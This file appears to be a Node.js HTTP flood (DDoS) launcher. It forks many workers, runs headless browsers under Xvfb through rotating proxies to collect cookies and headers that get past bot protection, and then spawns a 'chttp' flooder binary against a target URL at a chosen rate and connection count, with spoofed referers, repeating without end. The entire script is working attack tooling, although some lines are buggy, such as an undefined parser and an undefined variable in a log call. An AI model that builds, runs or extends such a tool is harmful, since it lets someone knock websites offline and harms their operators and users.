import { ArgumentParser } from 'argparse';
import cluster from 'cluster';
import { readFile } from 'fs/promises';
import { lookup } from 'dns/promises';
import { spawn } from 'child_process'
import { getRandomArr } from './utils.js';
import runBrowser from './browser.js';
import Xvfb from 'xvfb';



async function parseArgs() {
    const { proxies, browsers, url, time, rate, connection } = parser.parse_args();
    return { proxies: await proxies, browsers, time, rate, url, connection }
}

parser.add_argument('-f', '--proxies', { help: 'Proxies file', required: true, type: 
    async (pid) => (await Promise.all((await readFile(pid, 'utf8')).split('\n').map(async x => {
        if (x.length > 0) {
            const parts = x.split(':')
            if (parts.length >= 2) {
                const host = parts[0]
                const port = Number(parts[1])
                if ((await lookup(host, 4).catch(() => {})) != null && !isNaN(port) && port >= 0 && port <= 65535) {
                    return x
                }
            }
        }
        return false
    }))).filter(x => x != false)
});

parser.add_argument('-b', '--browsers', { help: 'Concurrent browsers', type: Number, required: true });
parser.add_argument('-u', '--url', { help: 'Target url', required: true });
parser.add_argument('-t', '--time', { help: 'Proxy List', type: Number, required: true });
parser.add_argument('-r', '--rate', { help: 'Rate Limit', type: Number, required: true });
parser.add_argument('-c', '--connection', { help: 'Connection Pipe', type: Number, required: true });

const { proxies, browsers, url, time, connection, rate } = await parseArgs();

if (cluster.isPrimary) {
    for (let i = 0; i < browsers; i++) {
        const worker = cluster.fork()
        worker.on('message', msg => {
            if (msg.type == 'start') {
                worker.send({
                    type: 'browser',
                    i
                })
            }
        })
    }
} else {
	try {
		const spawns = []
		
		process.on('exit', msg => {
		for (let pid of spawns) {}
			process.exit(0)
		}) 

		function getRandomInt(max) {
			return Math.floor(Math.random() * max);
		}
		
		process.on('message', msg => {
			if (msg.type == 'browser') {
				async function run() {
					const xvfb = new Xvfb({
						reuse: true,
						displayNum: getRandomInt(99999) + msg.i,
						xvfb_args: ['-maxclients', '2048']
					});
					xvfb.startSync()
					const proxy = getRandomArr(proxies)
					await runBrowser({
						i: msg.i,
						proxy: "http://" + proxy,
						url
					}).then((page) => {
						if (!page) {
							return;
							run();
						}
						delete page.headers['host'];
						delete page.headers['connection'];
						delete page.headers[':authority'];
						delete page.headers[':method'];
						delete page.headers[':path'];
						delete page.headers[':scheme'];
						const headerEntries = Object.entries(page.headers);
						const refererr = [
							'https://yahoo.com',
							'https://yandex.ru',
							'https://google.com',
							'https://duckduckgo.com',
						];
						
						const referer = refererr[Math.floor(Math.random() * refererr.length)];

						const args = [
							'-k', 'nxver',
							'-t', '1',
							'-T', '3600'
						].concat(proxy.indexOf("@") != -1 ? [
							'-x',
							proxy.split('@', 1)[0]
						] : []).concat([
							'-0', proxy.indexOf('@') != -1 ? proxy.split('@')[1] : proxy, 
							'-u', new URL(url).toString(),
							'-n', connection.toString(),
							'-r', rate.toString(),
							'-s', '1'
//							'-v'
						]).concat(
							...headerEntries.map((entry) => ["-h", `${entry[0]}@${entry[1]}`])
						).concat([
							'-h', `cookie@${page.cookies.length > 0 ? page.cookies : 'test=1'}`,
							'-h', `referer@${referer}`
						])
						
						const flooder = spawn('./chttp', args);
						console.log(args.join(' '), join)
						//run();
						spawns.push(flooder)
					})
					xvfb.stopSync()
					run();
				}
				run();
			}
		})
		process.send({ type: 'start' })
	} catch(error) {}
}
